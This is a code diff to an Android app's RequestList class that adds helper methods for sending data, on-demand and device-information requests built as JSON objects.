@@ -1,8 +1,5 @@
 package com.inet.android.request;
 
-import java.util.Calendar;
-import java.util.TimeZone;
-
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -10,6 +7,8 @@ import android.content.Context;
 import android.content.SharedPreferences;
 import android.preference.PreferenceManager;
 
+import com.inet.android.info.GetInfo;
+import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 
 public class RequestList {
@@ -95,7 +94,7 @@ public class RequestList {
 
 		JSONObject jsonObject = new JSONObject();
 		try {
-			
+
 			jsonObject.put("device", sp.getString("device", "0000"));
 			jsonObject.put("account", sp.getString("account", "0000"));
 			jsonObject.put("token", sp.getString("time_setub", ""));
@@ -136,9 +135,63 @@ public class RequestList {
 		PeriodicRequest pr = new PeriodicRequest(mContext);
 		pr.sendRequest(null);
 
-	
 	}
 
+	/**
+	 * Sending data request
+	 */
+	public static void sendDataRequest(String req, Context mContext) {
+		
+		Logging.doLog(LOG_TAG, "send data request", "send data request: ");
+		DataRequest dataReq = new DataRequest(mContext);
+		dataReq.sendRequest(req);
+	}
+	/**
+	 * Sending service data request
+	 */
+	public static void sendDataRequest(String area, String event, Context mContext) {
+		String sendJSONStr = null;
+	
+		try {
+			
+			JSONObject info = new JSONObject();
+			JSONObject object = new JSONObject();
+			info.put("area", area);
+			info.put("event", event);
+
+			object.put("time", ConvertDate.logTime());
+			object.put("type", "12");
+			object.put("info", info);
+			sendJSONStr = object.toString();
+		} catch (JSONException e) {
+			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
+		}
+		Logging.doLog(LOG_TAG, "send data request", "send data request: ");
+		DataRequest dataReq = new DataRequest(mContext);
+		dataReq.sendRequest(sendJSONStr);
+	}
+	
+	/**
+	 * Sending demand request
+	 */
+	public static void sendDemandRequest(String request, String infoType, String complete,
+			String version, Context mContext) {
+		OnDemandRequest dr = new OnDemandRequest(infoType, complete,
+				version, mContext);
+		dr.sendRequest(request);
+	}
+	
+	
+	/**
+	 * Sending demand request
+	 */
+	public static void sendInfoDeviceRequest(Context mContext) {
+		
+		GetInfo getInfo = new GetInfo(mContext);
+		getInfo.startGetInfo();
+	}
+	
+	
 	/**
 	 * Send a request for removal
 	 */
